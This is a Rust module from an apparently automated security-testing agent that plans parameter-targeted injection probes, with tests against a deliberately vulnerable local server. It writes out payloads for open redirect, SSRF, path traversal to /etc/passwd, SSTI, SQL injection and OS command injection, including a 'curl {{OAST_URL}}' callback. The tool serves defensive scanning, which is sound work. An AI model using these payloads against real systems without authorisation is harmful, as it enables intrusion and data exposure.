//! Parameter-targeted injection probes guided by parameter names, locations, and schemas:
//! - Redirect params -> Open Redirect (`ProbeOracle::OpenRedirect`) + SSRF
//! - URL / callback / webhook params -> SSRF (`ProbeOracle::OastCallback`)
//! - File / path / doc params -> Multi-encoding Path Traversal
//! - Template / text / message params -> SSTI (`{{1337*79}}`, `${1337*79}`)
//! - Search / filter / id / user params -> Boolean-differential & Time-delay SQLi
//! - Command / host / IP params -> Time-delay OS Command Injection

use std::collections::{BTreeSet, HashMap};

use serde_json::{Map, Value};

use crate::agent::discover::{Discovery, SpecDoc};
use crate::agent::exec::Credentials;
use crate::agent::plan::{Depth, mk, user_or_anon};
use crate::agent::types::{DiscoveredRoute, InputSurface, PlannedCase, ProbeOracle};
use crate::qa::api::spec::Op as ApiOp;
use crate::qa::api::synth;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ParamKind {
    Redirect,
    UrlLike,
    FilePath,
    TemplateOrText,
    SqlOrLookup,
    CmdExec,
    Generic,
}

/// Classify a query/form/JSON parameter by its name into an attack vector class.
pub fn classify_param(name: &str) -> ParamKind {
    let n = name.trim().to_ascii_lowercase();
    if n.is_empty() {
        return ParamKind::Generic;
    }
    let redirect_exact = [
        "redirect",
        "redirect_url",
        "redirect_uri",
        "redirecturl",
        "return",
        "return_url",
        "return_to",
        "returnto",
        "next",
        "next_url",
        "dest",
        "destination",
        "goto",
        "continue",
        "callback",
        "callback_url",
    ];
    if redirect_exact.contains(&n.as_str()) || n.contains("redirect") || n.starts_with("return_") {
        return ParamKind::Redirect;
    }
    if n == "url"
        || n == "uri"
        || n == "link"
        || n == "href"
        || n == "webhook"
        || n == "endpoint"
        || n == "feed"
        || n == "fetch"
        || n.ends_with("_url")
        || n.ends_with("_uri")
        || n.ends_with("url")
    {
        return ParamKind::UrlLike;
    }
    if matches!(
        n.as_str(),
        "file"
            | "filename"
            | "filepath"
            | "file_path"
            | "path"
            | "template_path"
            | "doc"
            | "document"
            | "include"
            | "load"
            | "attachment"
            | "report"
            | "dir"
            | "folder"
            | "page"
            | "view"
    ) {
        return ParamKind::FilePath;
    }
    if matches!(
        n.as_str(),
        "cmd"
            | "command"
            | "exec"
            | "host"
            | "hostname"
            | "ip"
            | "ping"
            | "domain"
            | "target_host"
            | "shell"
            | "run"
    ) {
        return ParamKind::CmdExec;
    }
    if matches!(
        n.as_str(),
        "name"
            | "title"
            | "template"
            | "tpl"
            | "msg"
            | "message"
            | "greeting"
            | "bio"
            | "comment"
            | "preview"
            | "body"
            | "subject"
            | "note"
            | "text"
            | "label"
            | "description"
    ) {
        return ParamKind::TemplateOrText;
    }
    if matches!(
        n.as_str(),
        "q" | "query"
            | "search"
            | "filter"
            | "sort"
            | "order"
            | "order_by"
            | "col"
            | "column"
            | "user"
            | "username"
            | "email"
            | "item"
            | "category"
            | "tag"
            | "status"
            | "slug"
    ) {
        return ParamKind::SqlOrLookup;
    }
    ParamKind::Generic
}

fn is_credential_flow(path: &str) -> bool {
    let p = path.to_ascii_lowercase();
    [
        "login", "logout", "signin", "signup", "register", "auth", "token", "password", "reset",
        "verify", "otp",
    ]
    .iter()
    .any(|k| p.contains(k))
}

fn sample_for_param(schema: &Value) -> String {
    let v = synth::synth(schema, "param", "readyhai-", 0);
    match v {
        Value::String(s) if !s.is_empty() && !s.contains(['&', '=', '#']) => s,
        Value::Number(n) => n.to_string(),
        Value::Bool(b) => b.to_string(),
        _ => "readyhai".into(),
    }
}

fn build_query_payload(
    base_pairs: &[(String, String)],
    target_key: &str,
    target_val: &str,
) -> String {
    let mut out = Vec::with_capacity(base_pairs.len() + 1);
    let mut replaced = false;
    for (k, v) in base_pairs {
        if k == target_key {
            out.push(format!("{k}={target_val}"));
            replaced = true;
        } else {
            out.push(format!("{k}={v}"));
        }
    }
    if !replaced {
        out.push(format!("{target_key}={target_val}"));
    }
    out.join("&")
}

fn build_json_payload(base: &Map<String, Value>, field: &str, val: &str) -> String {
    let mut m = base.clone();
    m.insert(field.to_string(), Value::String(val.to_string()));
    Value::Object(m).to_string()
}

struct InjectionTarget {
    method: String,
    component: String,
    label: String,
    role: String,
    secured: bool,
    param_name: String,
    sample: String,
    base_query: Vec<(String, String)>,
    base_json: Option<Map<String, Value>>,
    source: &'static str,
}

#[allow(clippy::too_many_arguments)]
fn emit_probes_for_target(t: &InjectionTarget, depth: Depth, out: &mut Vec<PlannedCase>) {
    let kind = classify_param(&t.param_name);
    let make_payload = |val: &str| -> String {
        match &t.base_json {
            Some(m) => build_json_payload(m, &t.param_name, val),
            None => build_query_payload(&t.base_query, &t.param_name, val),
        }
    };

    let push_case = |out: &mut Vec<PlannedCase>,
                     title: String,
                     hint: &str,
                     payload: String,
                     behavior: &str,
                     risk: &str,
                     oracle: Option<ProbeOracle>| {
        let mut c = mk(
            "injection",
            title,
            &t.method,
            t.component.clone(),
            hint,
            Some(payload),
            behavior,
            None,
            risk,
            &t.role,
            t.source,
        );
        c.secured = Some(t.secured);
        c.probe_oracle = oracle;
        out.push(c);
    };

    match kind {
        ParamKind::Redirect => {
            if matches!(t.method.as_str(), "GET" | "HEAD") {
                push_case(
                    out,
                    format!("Open redirect via `{}` on {}", t.param_name, t.label),
                    "Supply an external canary URL to redirect parameter",
                    make_payload("https://evil.example/rh-redirect"),
                    "Target must not redirect users to arbitrary external domains",
                    "high",
                    Some(ProbeOracle::OpenRedirect {
                        canary_host: "evil.example".into(),
                    }),
                );
            }
            push_case(
                out,
                format!("SSRF OAST probe via `{}` on {}", t.param_name, t.label),
                "Inject temporary OAST callback URL to verify outbound server fetches",
                make_payload("{{OAST_URL}}"),
                "Target must not perform outbound requests to attacker-controlled URLs",
                "critical",
                Some(ProbeOracle::OastCallback {
                    placeholder: "{{OAST_URL}}".into(),
                    wait_ms: 800,
                }),
            );
        }
        ParamKind::UrlLike => {
            push_case(
                out,
                format!("SSRF OAST probe via `{}` on {}", t.param_name, t.label),
                "Inject temporary OAST callback URL to detect blind/semi-blind SSRF",
                make_payload("{{OAST_URL}}"),
                "Target must not fetch arbitrary external callback URLs",
                "critical",
                Some(ProbeOracle::OastCallback {
                    placeholder: "{{OAST_URL}}".into(),
                    wait_ms: 800,
                }),
            );
            if depth == Depth::Deep && matches!(t.method.as_str(), "GET" | "HEAD") {
                push_case(
                    out,
                    format!("Open redirect via `{}` on {}", t.param_name, t.label),
                    "Supply external canary URL to URL parameter",
                    make_payload("https://evil.example/rh-redirect"),
                    "Target must not issue 3xx redirects to untrusted external hosts",
                    "high",
                    Some(ProbeOracle::OpenRedirect {
                        canary_host: "evil.example".into(),
                    }),
                );
            }
        }
        ParamKind::FilePath => {
            push_case(
                out,
                format!(
                    "Path traversal double-encoded probe via `{}` on {}",
                    t.param_name, t.label
                ),
                "Inject double-URL-encoded traversal payload into file/path parameter",
                make_payload("..%252f..%252f..%252fetc%252fpasswd"),
                "Path traversal must be blocked without leaking filesystem contents",
                "critical",
                None,
            );
            if depth == Depth::Deep {
                push_case(
                    out,
                    format!(
                        "Path traversal nested filter bypass probe via `{}` on {}",
                        t.param_name, t.label
                    ),
                    "Inject nested `....//` traversal sequence into file/path parameter",
                    make_payload("....//....//....//etc/passwd"),
                    "Nested traversal sequences must not bypass sanitization",
                    "critical",
                    None,
                );
            }
        }
        ParamKind::TemplateOrText => {
            push_case(
                out,
                format!(
                    "SSTI Jinja/Twig arithmetic probe via `{}` on {}",
                    t.param_name, t.label
                ),
                "Inject `{{1337*79}}` and assert server does not evaluate expression",
                make_payload("{{1337*79}}"),
                "Template syntax must be rendered literally or rejected, never evaluated to 105623",
                "critical",
                Some(ProbeOracle::Ssti {
                    expected_eval: "105623".into(),
                }),
            );
            if depth == Depth::Deep {
                push_case(
                    out,
                    format!(
                        "SSTI Spring/EL arithmetic probe via `{}` on {}",
                        t.param_name, t.label
                    ),
                    "Inject `${1337*79}` expression template probe",
                    make_payload("${1337*79}"),
                    "Expression language syntax must never evaluate to 105623",
                    "critical",
                    Some(ProbeOracle::Ssti {
                        expected_eval: "105623".into(),
                    }),
                );
            }
        }
        ParamKind::SqlOrLookup => {
            let base = make_payload(&t.sample);
            let true_pl = make_payload(&format!("{}' OR '1'='1", t.sample));
            let false_pl = make_payload(&format!("{}' AND '1'='2", t.sample));
            push_case(
                out,
                format!(
                    "Blind boolean SQLi differential via `{}` on {}",
                    t.param_name, t.label
                ),
                "Compare true vs false boolean SQL injection predicates against baseline",
                true_pl,
                "Boolean SQL predicates must not alter query result cardinalities",
                "critical",
                Some(ProbeOracle::BooleanDiff {
                    baseline_payload: base.clone(),
                    false_payload: false_pl,
                }),
            );
            if depth == Depth::Deep {
                push_case(
                    out,
                    format!(
                        "Blind time-based SQLi via `{}` on {}",
                        t.param_name, t.label
                    ),
                    "Inject time-delay SQL payload and compare latency against baseline",
                    make_payload("1' OR SLEEP(3)-- "),
                    "Input must not trigger measurable database sleep delays",
                    "critical",
                    Some(ProbeOracle::TimeDelay {
                        baseline_payload: base,
                        min_delay_ms: 2500,
                    }),
                );
            }
        }
        ParamKind::CmdExec => {
            let base = make_payload(&t.sample);
            push_case(
                out,
                format!(
                    "Blind OS command injection time delay via `{}` on {}",
                    t.param_name, t.label
                ),
                "Inject shell command separator sleep payload and compare timing against baseline",
                make_payload("127.0.0.1; sleep 3"),
                "Parameter must not invoke OS shell commands or introduce execution delays",
                "critical",
                Some(ProbeOracle::TimeDelay {
                    baseline_payload: base,
                    min_delay_ms: 2500,
                }),
            );
            if depth == Depth::Deep {
                push_case(
                    out,
                    format!(
                        "Blind OS command injection OAST via `{}` on {}",
                        t.param_name, t.label
                    ),
                    "Inject shell subcommand fetching OAST callback URL",
                    make_payload("127.0.0.1; curl {{OAST_URL}}"),
                    "Parameter must not execute outbound shell fetches",
                    "critical",
                    Some(ProbeOracle::OastCallback {
                        placeholder: "{{OAST_URL}}".into(),
                        wait_ms: 800,
                    }),
                );
            }
        }
        ParamKind::Generic => {}
    }
}

fn spec_targets(
    spec: &SpecDoc,
    ids: &std::collections::BTreeMap<String, Vec<String>>,
    creds: &Credentials,
    max_ops: usize,
) -> Vec<InjectionTarget> {
    let acting = user_or_anon(creds);
    let has_actor = creds.actor().is_some();
    let api_ops = spec.api_ops();
    let mut out = Vec::new();
    let mut ops_seen = 0usize;

    for api in api_ops.iter().filter(|a| {
        matches!(a.method.as_str(), "GET" | "POST" | "PUT" | "PATCH")
            && !is_credential_flow(&a.path)
            && (!a.secured || has_actor)
    }) {
        if ops_seen >= max_ops {
            break;
        }
        let path_vals: HashMap<String, String> = if api.is_write() {
            crate::qa::api::unlikely_ids(api)
        } else {
            crate::qa::api::collection_of(api)
                .and_then(|(list, param)| {
                    ids.get(&list)
                        .and_then(|v| v.first())
                        .map(|id| HashMap::from([(param, id.clone())]))
                })
                .unwrap_or_default()
        };
        let component = synth::build_url(&spec.base_path, &api.path, &path_vals, &[]);
        let label = format!("{} {}", api.method, api.path);
        let role = if api.secured {
            acting.clone()
        } else {
            "anon".into()
        };

        let mut base_query = Vec::new();
        for p in api.params.iter().filter(|p| p.loc == "query") {
            let s = synth::flatten(&p.schema);
            if matches!(synth::schema_type(&s), "string" | "") {
                base_query.push((p.name.clone(), sample_for_param(&s)));
            }
        }

        let mut added_for_op = false;
        if matches!(api.method.as_str(), "GET" | "HEAD") {
            for p in api.params.iter().filter(|p| p.loc == "query") {
                if classify_param(&p.name) != ParamKind::Generic {
                    let sample = base_query
                        .iter()
                        .find(|(k, _)| k == &p.name)
                        .map(|(_, v)| v.clone())
                        .unwrap_or_else(|| "readyhai".into());
                    out.push(InjectionTarget {
                        method: api.method.clone(),
                        component: component.clone(),
                        label: label.clone(),
                        role: role.clone(),
                        secured: api.secured,
                        param_name: p.name.clone(),
                        sample,
                        base_query: base_query.clone(),
                        base_json: None,
                        source: "openapi",
                    });
                    added_for_op = true;
                }
            }
        }

        if let Some(body_schema) = &api.body {
            let flat = synth::flatten(body_schema);
            if let Value::Object(base_map) = synth::synth(&flat, "body", "readyhai-", 0)
                && let Some(props) = flat.get("properties").and_then(Value::as_object)
            {
                for (prop_name, prop_schema) in props {
                    let ps = synth::flatten(prop_schema);
                    if synth::schema_type(&ps) == "string"
                        && classify_param(prop_name) != ParamKind::Generic
                    {
                        out.push(InjectionTarget {
                            method: api.method.clone(),
                            component: component.clone(),
                            label: label.clone(),
                            role: role.clone(),
                            secured: api.secured,
                            param_name: prop_name.clone(),
                            sample: sample_for_param(&ps),
                            base_query: Vec::new(),
                            base_json: Some(base_map.clone()),
                            source: "openapi",
                        });
                        added_for_op = true;
                    }
                }
            }
        }

        if added_for_op {
            ops_seen += 1;
        }
    }
    out
}

fn crawl_targets(d: &Discovery, creds: &Credentials, max_routes: usize) -> Vec<InjectionTarget> {
    if max_routes == 0 {
        return Vec::new();
    }
    let acting = user_or_anon(creds);
    let has_role = creds.actor().is_some();
    let mut seen = BTreeSet::new();
    let mut out = Vec::new();

    for r in d.routes.iter().filter(|r: &&DiscoveredRoute| {
        r.source != "probe"
            && !r.catch_all
            && !r.is_spa_shell
            && !r.auth_wall
            && !is_credential_flow(&r.path)
            && matches!(r.input_surface, InputSurface::Query | InputSurface::Form)
            && (has_role || !matches!(r.status_code, 401 | 403))
    }) {
        if out.len() >= max_routes {
            break;
        }
        let base_path = r.path.split('?').next().unwrap_or(&r.path);
        if let Some(qs) = r.path.split_once('?').map(|(_, q)| q) {
            let pairs: Vec<(String, String)> = qs
                .split('&')
                .filter_map(|p| p.split_once('='))
                .map(|(k, v)| {
                    (
                        k.to_string(),
                        if v.is_empty() {
                            "readyhai".into()
                        } else {
                            v.to_string()
                        },
                    )
                })
                .collect();
            for (k, v) in &pairs {
                if classify_param(k) != ParamKind::Generic
                    && seen.insert((r.path.clone(), k.clone()))
                {
                    out.push(InjectionTarget {
                        method: "GET".into(),
                        component: base_path.to_string(),
                        label: format!("GET {base_path}"),
                        role: if matches!(r.status_code, 401 | 403) {
                            acting.clone()
                        } else {
                            "anon".into()
                        },
                        secured: matches!(r.status_code, 401 | 403),
                        param_name: k.clone(),
                        sample: v.clone(),
                        base_query: pairs.clone(),
                        base_json: None,
                        source: "deterministic",
                    });
                }
            }
        } else if seen.insert((r.path.clone(), "template".into())) {
            // Non-FP fallback SSTI check when crawl found a Query/Form endpoint without named params.
            out.push(InjectionTarget {
                method: if r.has_form { "POST" } else { "GET" }.into(),
                component: r.path.clone(),
                label: r.path.clone(),
                role: acting.clone(),
                secured: matches!(r.status_code, 401 | 403),
                param_name: "name".into(),
                sample: "readyhai".into(),
                base_query: vec![],
                base_json: None,
                source: "deterministic",
            });
        }
    }
    if out.is_empty() {
        // Fallback for web applications without query-string links: probe the accessible entry page
        let candidate = d.routes.iter().find(|r| {
            r.source != "probe"
                && !r.catch_all
                && !r.is_spa_shell
                && !r.auth_wall
                && (has_role || !matches!(r.status_code, 401 | 403))
        });
        if let Some(r) = candidate {
            let base_path = r.path.split('?').next().unwrap_or(&r.path);
            out.push(InjectionTarget {
                method: "GET".into(),
                component: base_path.to_string(),
                label: format!("GET {base_path}"),
                role: acting,
                secured: matches!(r.status_code, 401 | 403),
                param_name: "q".into(),
                sample: "readyhai".into(),
                base_query: vec![("q".into(), "readyhai".into())],
                base_json: None,
                source: "attacks",
            });
        }
    }
    out
}

/// Plan parameter-targeted injection cases grounded in OpenAPI schemas or discovered routes.
pub fn plan_injection_attacks(
    d: &Discovery,
    creds: &Credentials,
    depth: Depth,
) -> Vec<PlannedCase> {
    let (max_ops, max_crawl, max_cases) = match depth {
        Depth::Quick => return Vec::new(),
        Depth::Standard => (4, 1, 12),
        Depth::Deep => (8, 3, 28),
    };
    let targets = match &d.spec {
        Some(spec) => spec_targets(spec, &d.ids, creds, max_ops),
        None => crawl_targets(d, creds, max_crawl),
    };

    let mut out = Vec::new();
    for t in &targets {
        if out.len() >= max_cases {
            break;
        }
        emit_probes_for_target(t, depth, &mut out);
    }
    out.truncate(max_cases);
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::agent::budget::RunBudget;
    use crate::agent::discover::{Discovery, SpecDoc};
    use crate::agent::exec::{Credentials, ExecOptions, execute_cases_gated};
    use crate::agent::types::ProbeOracle;
    use crate::qa::plan::Op;
    use axum::extract::Query;
    use axum::http::{HeaderValue, StatusCode, header};
    use axum::response::IntoResponse;
    use axum::routing::{get, post};
    use axum::{Json, Router};
    use serde_json::json;
    use std::collections::HashMap;
    use tokio::net::TcpListener;

    #[test]
    fn parameter_classifier_maps_semantics_accurately() {
        assert_eq!(classify_param("redirect_uri"), ParamKind::Redirect);
        assert_eq!(classify_param("next"), ParamKind::Redirect);
        assert_eq!(classify_param("webhook_url"), ParamKind::UrlLike);
        assert_eq!(classify_param("avatar_url"), ParamKind::UrlLike);
        assert_eq!(classify_param("filename"), ParamKind::FilePath);
        assert_eq!(classify_param("template"), ParamKind::TemplateOrText);
        assert_eq!(classify_param("greeting"), ParamKind::TemplateOrText);
        assert_eq!(classify_param("order_by"), ParamKind::SqlOrLookup);
        assert_eq!(classify_param("target_host"), ParamKind::CmdExec);
        assert_eq!(classify_param("page_size"), ParamKind::Generic);
    }

    #[test]
    fn plans_and_executes_targeted_ssrf_open_redirect_ssti_and_boolean_sqli() {
        let rt = tokio::runtime::Runtime::new().unwrap();
        let url = rt.block_on(async {
            let client = reqwest::Client::new();
            let app = Router::new()
                .route(
                    "/go",
                    get(|Query(q): Query<HashMap<String, String>>| async move {
                        if let Some(next) = q.get("next") {
                            let mut resp = StatusCode::FOUND.into_response();
                            if let Ok(hv) = HeaderValue::from_str(next) {
                                resp.headers_mut().insert(header::LOCATION, hv);
                            }
                            return resp;
                        }
                        StatusCode::OK.into_response()
                    }),
                )
                .route(
                    "/fetch",
                    post(move |Json(v): Json<serde_json::Value>| {
                        let client = client.clone();
                        async move {
                            if let Some(u) = v.get("webhook_url").and_then(|s| s.as_str()) {
                                let _ = client.get(u).send().await;
                            }
                            (StatusCode::OK, Json(json!({"queued": true})))
                        }
                    }),
                )
                .route(
                    "/render",
                    get(|Query(q): Query<HashMap<String, String>>| async move {
                        let name = q.get("name").map(String::as_str).unwrap_or("world");
                        let rendered = if name.contains("{{1337*79}}") {
                            "Hello 105623".to_string()
                        } else {
                            format!("Hello {name}")
                        };
                        (StatusCode::OK, rendered)
                    }),
                )
                .route(
                    "/items",
                    get(|Query(q): Query<HashMap<String, String>>| async move {
                        let s = q.get("search").map(String::as_str).unwrap_or("");
                        if s.contains("'1'='2") {
                            (StatusCode::OK, Json(json!({"items": []})))
                        } else {
                            (
                                StatusCode::OK,
                                Json(json!({"items": [{"id": 1, "title": "Widget Alpha"}, {"id": 2, "title": "Widget Beta"}]})),
                            )
                        }
                    }),
                )
                .route(
                    "/clean",
                    get(|Query(q): Query<HashMap<String, String>>| async move {
                        let _ = q;
                        (StatusCode::OK, Json(json!({"items": []})))
                    }),
                );
            let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
            let addr = listener.local_addr().unwrap();
            tokio::spawn(async move {
                axum::serve(listener, app).await.unwrap();
            });
            format!("http://{addr}")
        });

        let openapi = json!({
            "openapi": "3.0.3",
            "info": {"title": "Test", "version": "1"},
            "paths": {
                "/go": {
                    "get": {
                        "parameters": [{"name": "next", "in": "query", "schema": {"type": "string"}}]
                    }
                },
                "/fetch": {
                    "post": {
                        "requestBody": {
                            "required": true,
                            "content": {"application/json": {"schema": {
                                "type": "object",
                                "required": ["webhook_url"],
                                "properties": {"webhook_url": {"type": "string"}}
                            }}}
                        },
                        "responses": {"200": {"description": "ok"}}
                    }
                },
                "/render": {
                    "get": {
                        "parameters": [{"name": "name", "in": "query", "schema": {"type": "string"}}]
                    }
                },
                "/items": {
                    "get": {
                        "parameters": [{"name": "search", "in": "query", "schema": {"type": "string"}}]
                    }
                },
                "/clean": {
                    "get": {
                        "parameters": [{"name": "search", "in": "query", "schema": {"type": "string"}}]
                    }
                }
            }
        });
        let doc = SpecDoc {
            base_path: "".into(),
            source: "openapi.json".into(),
            doc: openapi,
            ops: vec![
                Op {
                    method: "GET".into(),
                    path: "/go".into(),
                    operation_id: None,
                    secured: false,
                    has_body: false,
                },
                Op {
                    method: "POST".into(),
                    path: "/fetch".into(),
                    operation_id: None,
                    secured: false,
                    has_body: true,
                },
                Op {
                    method: "GET".into(),
                    path: "/render".into(),
                    operation_id: None,
                    secured: false,
                    has_body: false,
                },
                Op {
                    method: "GET".into(),
                    path: "/items".into(),
                    operation_id: None,
                    secured: false,
                    has_body: false,
                },
                Op {
                    method: "GET".into(),
                    path: "/clean".into(),
                    operation_id: None,
                    secured: false,
                    has_body: false,
                },
            ],
        };
        let mut d = Discovery::default();
        d.spec = Some(doc);
        let creds = Credentials::none();

        assert!(plan_injection_attacks(&d, &creds, Depth::Quick).is_empty());

        let mut cases = plan_injection_attacks(&d, &creds, Depth::Deep);
        assert!(cases.iter().any(|c| matches!(
            c.probe_oracle,
            Some(ProbeOracle::OpenRedirect { .. })
        ) && c.component == "/go"));
        assert!(cases.iter().any(|c| matches!(
            c.probe_oracle,
            Some(ProbeOracle::OastCallback { .. })
        ) && c.component == "/fetch"));
        assert!(
            cases
                .iter()
                .any(|c| matches!(c.probe_oracle, Some(ProbeOracle::Ssti { .. }))
                    && c.component == "/render")
        );
        assert!(cases.iter().any(|c| matches!(
            c.probe_oracle,
            Some(ProbeOracle::BooleanDiff { .. })
        ) && c.component == "/items"));

        for (i, c) in cases.iter_mut().enumerate() {
            c.id = format!("INJ-{:03}", i + 1);
        }
        let mut budget = RunBudget::new(200, 200, std::time::Duration::from_secs(30), 50.0);
        let results = execute_cases_gated(&cases, &url, &ExecOptions::default(), &mut budget, None);

        assert!(
            results
                .iter()
                .any(|r| r.status == "FAIL" && r.component.starts_with("/go")),
            "expected open redirect fail: {results:?}"
        );
        assert!(
            results
                .iter()
                .any(|r| r.status == "FAIL" && r.component == "/fetch"),
            "expected SSRF OAST fail: {results:?}"
        );
        assert!(
            results
                .iter()
                .any(|r| r.status == "FAIL" && r.component.starts_with("/render")),
            "expected SSTI fail: {results:?}"
        );
        assert!(
            results
                .iter()
                .any(|r| r.status == "FAIL" && r.component.starts_with("/items")),
            "expected blind boolean SQLi fail: {results:?}"
        );
        assert!(
            !results
                .iter()
                .any(|r| r.status == "FAIL" && r.component.starts_with("/clean")),
            "clean route must never fail: {results:?}"
        );
    }
}
